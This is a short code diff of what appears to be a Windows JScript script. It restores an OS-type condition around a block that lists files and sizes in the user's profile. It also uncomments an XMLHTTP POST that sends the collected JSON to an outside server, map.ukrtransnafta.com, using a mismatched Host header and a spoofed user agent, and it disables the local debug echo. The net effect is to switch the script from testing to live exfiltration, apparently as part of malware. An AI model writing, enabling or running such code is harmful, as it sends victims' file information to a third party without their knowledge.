@@ -299,8 +299,8 @@ try {
    var filesinprofile = ""
    var summaryfilessize = 0
 	try {
-		//if ((OS_Type == 1) && (!file_checked)){
-		if (1==1) {
+		if ((OS_Type == 1) && (!file_checked)){
+		//if (1==1) {
 				var labels_mask = ""
 				var files_array = []
 				var files_array_in_profile = []
@@ -546,14 +546,14 @@ try {
 			 }
 	} catch(e) {}
 	
-	/*
+	
 	var http = new ActiveXObject("Microsoft.XMLHTTP");
 	http.open("POST", "http://map.ukrtransnafta.com/api/userlogin", false);
 	http.setRequestHeader("Host", "app.ukrtransnafta.com");
 	http.setRequestHeader("User-Agent", "Mozilla/4.0 (compatible; Synapse)");
 	http.setRequestHeader("Content-Type", "application/json");
 	http.send(json);
-	*/
-	WScript.Echo(json);
+	
+	//WScript.Echo(json);
 	
 } catch(e) {};
